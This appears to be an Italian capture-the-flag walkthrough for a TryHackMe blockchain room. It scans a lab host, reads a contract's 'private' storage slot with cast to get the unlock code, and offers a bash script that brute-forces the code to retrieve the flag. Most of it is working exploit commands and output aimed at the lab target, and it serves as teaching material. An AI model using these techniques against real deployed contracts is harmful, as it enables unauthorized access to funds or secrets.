
https://tryhackme.com/room/hfb1passcode



Potremmo aver trovato un modo per penetrare nella blockchain di DarkInject, sfruttando una vulnerabilità nel loro sistema. Questa potrebbe essere la nostra unica possibilità di fermarli, per sempre.

 l'IP della macchina di destinazione apparirà qui:

```
10.10.115.172
```

È quindi possibile utilizzare AttackBox o la propria macchina per attaccare l'indirizzo IP della macchina di destinazione.

```shell-session
root@attacker:~# RPC_URL=http://10.10.115.172:8545
root@attacker:~# API_URL=http://10.10.115.172
root@attacker:~# PRIVATE_KEY=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.private_key")
root@attacker:~# CONTRACT_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".contract_address")
root@attacker:~# PLAYER_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.address")
root@attacker:~# is_solved=`cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL}`
root@attacker:~# echo "Check if is solved: $is_solved"
Check if is solved: false
```


```
nmap -Pn -v -p- 10.10.115.172
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8545/tcp open  unknown
```

```
nmap -sCV -p22,80,8545 10.10.115.172
```
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     content-type: application/json; charset=utf-8
|     content-length: 107
|     Date: Mon, 26 May 2025 04:46:31 GMT
|     Connection: close
|     {"message":"Route GET:/nice%20ports%2C/Tri%6Eity.txt%2ebak not found","error":"Not Found","statusCode":404}
|   GetRequest: 
|     HTTP/1.1 200 OK
|     accept-ranges: bytes
|     cache-control: public, max-age=0
|     last-modified: Fri, 05 Jul 2024 01:23:44 GMT
|     etag: W/"1cc-190807d7500"
|     content-type: text/html; charset=UTF-8
|     content-length: 460
|     Date: Mon, 26 May 2025 04:46:31 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/vite.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>Blockchain Challenge</title>
|     <script type="module" crossorigin src="/assets/index-9ec22451.js"></script>
|     <link rel="stylesheet" href="/assets/index-f2ea3435.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     content-type: application/json; charset=utf-8
|     content-length: 76
|     Date: Mon, 26 May 2025 04:46:31 GMT
|     Connection: close
|     {"message":"Route OPTIONS:/ not found","error":"Not Found","statusCode":404}
|   X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 65
|     Content-Type: application/json
|_    {"error":"Bad Request","message":"Client Error","statusCode":400}
|_http-title: Blockchain Challenge
8545/tcp open  daap    mt-daapd DAAP

```
vediamo cosa c'è in
```
http://10.10.115.172/
```
troviamo una Blockchain Challenge
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Challenge {
    string private secret = "THM{}";
    bool private unlock_flag = false;
    uint256 private code;
    string private hint_text;
    
    constructor(string memory flag, string memory challenge_hint, uint256 challenge_code) {
        secret = flag;
        code = challenge_code;
        hint_text = challenge_hint;
    }
    
    function hint() external view returns (string memory) {
        return hint_text;
    }
    
    function unlock(uint256 input) external returns (bool) {
        if (input == code) {
            unlock_flag = true;
            return true;
        }
        return false;
    }
    
    function isSolved() external view returns (bool) {
        return unlock_flag;
    }
    
    function getFlag() external view returns (string memory) {
        require(unlock_flag, "Challenge not solved yet");
        return secret;
    }
}
```
Il codice Solidity fornito definisce un contratto chiamato `Challenge`, che implementa una semplice sfida di sblocco. Ecco una sintesi delle sue funzionalità e delle vulnerabilità:

**Funzionalità del Contratto**

**Vulnerabilità**

1. **Accesso al Flag**: La funzione `getFlag()` richiede che `unlock_flag` sia `true` per restituire il flag. Tuttavia, se un attaccante conosce il valore di `code`, può facilmente sbloccare il contratto.
    
2. **Mancanza di Protezione**: Non ci sono meccanismi di protezione per limitare il numero di tentativi di sblocco. Un attaccante può tentare ripetutamente di indovinare il codice senza alcuna penalità.
    
3. **Visibilità delle Variabili**: Le variabili di stato come `code` e `hint_text` sono accessibili tramite funzioni pubbliche, il che potrebbe rivelare informazioni sensibili se non gestite correttamente.

```
RPC_URL=http://10.10.115.172:8545
```
```
RPC_URL=http://10.10.115.172:8545
```
```
API_URL=http://10.10.115.172
```
```
PRIVATE_KEY=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.private_key")
```
```
CONTRACT_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".contract_address")
```
```
PLAYER_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.address")
```
```
is_solved=`cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL}`
```
```
echo "Check if is solved: $is_solved"
```
Check if is solved: false

 Il codice segreto è una variabile privata all'interno del contratto,  sulla blockchain, _privato_ significa  _nascosto nel codice_ , cioè non accessibile al pubblico.
```
cast storage $CONTRACT_ADDRESS 2 --rpc-url $RPC_URL
```
```
0x000000000000000000000000000000000000000000000000000000000000014d
```

Mi ha restituito un valore esadecimale `0x14d`che si converte nel decimale **333** : che è il codice segreto

```
cast send $CONTRACT_ADDRESS "unlock(uint256)" 333 --rpc-url $RPC_URL --private-key $PRIVATE_KEY --legacy
```

```
root@ip-10-10-240-218:~# cast send $CONTRACT_ADDRESS "unlock(uint256)" 333 --rpc-url $RPC_URL --private-key $PRIVATE_KEY --legacy

blockHash               0x23aaa8220163255eaff8b51d5a010c0a0c15e81d97e286c752dee948db16454b
blockNumber             3
contractAddress         
cumulativeGasUsed       43123
effectiveGasPrice       1000000000
from                    0x67a3218aa0aaE4ea9C2aE349B72A01ED6B3DdC64
gasUsed                 43123
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                    
status                  1 (success)
transactionHash         0xd7bfdba795d297260f3e9672e0016485ae65bc6692eed5cea9f8a18302cf0a39
transactionIndex        0
type                    0
blobGasPrice            
blobGasUsed             
to                      0xf22cB0Ca047e88AC996c17683Cee290518093574

```

```
cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url $RPC_URL
```
```
root@ip-10-10-240-218:~# cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url $RPC_URL
true

```


```
cast call $CONTRACT_ADDRESS "getFlag()(string)" --rpc-url $RPC_URL
```
```
root@ip-10-10-240-218:~# cast call $CONTRACT_ADDRESS "getFlag()(string)" --rpc-url $RPC_URL
"THM{**********}"

```

```
THM{***********}
```
Un'altra possibile soluzione è utilizzare il brute force
```
nano bf.sh
```
```
#!/bin/bash

# Imposta le variabili
RPC_URL=http://10.10.115.172:8545
API_URL=http://10.10.115.172

# Recupera i valori
PRIVATE_KEY=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.private_key")
CONTRACT_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".contract_address")
PLAYER_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.address")

# Controlla se la sfida è risolta
is_solved=$(cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL})

# Stampa il risultato
echo "Check if is solved: $is_solved"

# Se non è risolto, prova i codici da 300 a 350
if [ "$is_solved" == "false" ]; then
    for CODE_TO_UNLOCK in {300..350}; do
        # Invia la transazione per sbloccare il contratto
        tx_hash=$(cast send $CONTRACT_ADDRESS "unlock(uint256)" $CODE_TO_UNLOCK --rpc-url $RPC_URL --private-key $PRIVATE_KEY --legacy)

        # Controlla se la sfida è risolta dopo l'invio
        is_solved=$(cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL})

        if [ "$is_solved" == "true" ]; then
            echo "Challenge solved with code: $CODE_TO_UNLOCK"
            # Estrai il flag
            FLAG=$(cast call $CONTRACT_ADDRESS "getFlag()(string)" --rpc-url ${RPC_URL})
            echo "Flag: $FLAG"
            break
        else
            echo "Code $CODE_TO_UNLOCK did not work."
        fi
    done
else
    echo "The challenge is already solved."
fi
```

```
chmod +x bf.sh
```

```
./bf.sh
```

trova il codice ed estrae la flag!

